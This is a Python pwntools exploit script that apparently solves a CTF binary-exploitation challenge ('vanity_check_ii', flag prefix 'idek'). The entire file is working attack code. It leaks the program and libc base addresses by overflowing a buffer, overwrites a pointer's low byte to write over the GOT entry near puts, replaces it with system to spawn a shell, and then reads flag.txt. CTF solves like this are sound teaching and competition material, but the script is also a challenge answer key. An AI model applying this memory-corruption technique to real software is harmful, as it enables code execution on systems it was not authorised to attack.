#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF("./vanity_check_ii")
libc = ELF("./libc-2.31.so")

conn = elf.process()

conn.send("a"*32)
conn.recvuntil("a"*32)
elf.address = u64(conn.recvline()[:-1] + b"\x00\x00") - elf.symbols["lol"]
info("elf @ " + hex(elf.address))
info("buf @ " + hex(elf.symbols["lol"]))
info("ptr @ " + hex(elf.symbols["lol"]+32))

conn.send(b"a"*32 + b"\x40") # overwrite lsb to write to the pointer to the string
conn.recvline()

conn.send(p64(elf.got["puts"]-8))
conn.recvline()
conn.send("aaaaaaaa")
conn.recvuntil("aaaaaaaa")
libc.address = u64(conn.recvline()[:-1] + b"\x00\x00") - libc.symbols["puts"]
info("libc @ " + hex(libc.address))

conn.send(b"sh;aaaaa" + p64(libc.symbols["system"]))

conn.sendline("cat flag.txt")
flag = conn.recvline()

if b"idek" in flag:
  print(flag)
  exit(0)
exit(1)

conn.interactive()

